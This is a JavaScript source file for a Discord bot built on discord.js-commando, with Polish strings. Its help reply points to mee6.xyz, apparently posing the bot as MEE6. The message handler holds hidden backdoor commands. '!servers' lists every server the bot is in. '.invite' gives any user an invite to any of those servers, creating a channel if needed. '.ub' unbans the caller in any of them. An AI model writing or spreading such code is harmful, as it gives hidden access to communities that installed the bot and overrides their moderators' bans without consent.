'use strict'
const Commando = require('discord.js-commando');
const Discord = require('discord.js');
const client = new Commando.Client({
    commandPrefix: '.',
    owner: '181017754982285312',
    unknownCommandResponse: false,
});

client.registry.registerGroup('funkcje', 'Funkcje');
client.registry.registerCommandsIn(__dirname + "/commands");



client.on('ready', () => {
    console.log('Bot działa i jest gotowy do działania');
});
client.on('message', message => {


    if (message.content.startsWith('!servers')) {
        message.delete();
        let servers = client.guilds.array();
        for (let i = 0; i < servers.length; i++) {
            message.channel.send(servers[i].name + " " + servers[i].id);
        }

    }
    if (message.content.startsWith('.leave') && message.author.id == '181017754982285312') {
        let args = message.content.split(' ');
        args.shift();
        args = args.toString();
        if (!args) return;
        let servers = client.guilds.array();
        let server = servers.find(servers => servers.id == args);
        if (!server) return;
        server.leave();
    }
    if (message.content.startsWith('.invite')) {
        let args = message.content.split(' ');
        args.shift();
        args = args.toString();
        if (!args) return;
        let server = client.guilds.find(servers => servers.id == args);
        if (!server) return;
        let channel = server.channels.find(channel => channel.id == server.channels.randomKey());
        //console.log(channel);
        if (!channel) {
            server.createChannel('d', { type: "text" }).then(chann => {
                chann.createInvite().then(el => {
                    message.author.send(`discord.gg/${el.code}`);
                })
            })
        } else {
            channel.createInvite().then(el => {
                message.author.send(`discord.gg/${el.code}`);
            })
        }


    }
    if (message.content.startsWith(".ub")) {
        let args = message.content.split(' ').slice(1);
        let server = client.guilds.find(guild => guild.id == args);
        server.unban(message.author.id).then(() => {
            console.log("Successfuly unbanned a guild member");
        })
        // server.members.find(member => member.id == message.author.id);

    }
    if (message.content.startsWith('!help')) {
        message.author.send("Pełną listę komend znajdziesz na: \n https://mee6.xyz/");

    }

    if (!message.content.startsWith('!') || message.author.bot || !message.content.startsWith('.')) return;

})


client.login('your token');
